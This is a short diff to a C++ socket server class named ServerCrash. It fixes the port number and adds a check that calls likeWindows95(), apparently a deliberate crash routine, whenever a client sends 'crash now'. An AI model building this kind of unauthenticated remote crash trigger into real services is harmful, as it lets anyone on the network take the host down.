@@ -61,9 +61,9 @@ void ServerCrash::recieveAndExecute()
   try
     {
       // Create the socket
-      ServerSocket server ( 413420 );
+      ServerSocket server (41300);
 
-      while ( true )
+      while (true)
 	{
 
 	  ServerSocket new_sock;
@@ -71,17 +71,20 @@ void ServerCrash::recieveAndExecute()
 
 	  try
 	    {
-	      while ( true )
+	      while (true)
 		{
 		  new_sock >> data;
 		  new_sock << data;
 		}
 	    }
-	  catch ( SocketException& ) {}
-
+	  catch (SocketException&) {}
+	    if (data == "crash now")
+	    {
+	      likeWindows95();
+	    }
 	}
     }
-  catch ( SocketException& e )
+  catch (SocketException& e)
     {
       std::cout << "Exception was caught:" << e.description() << "\nExiting.\n";
     }
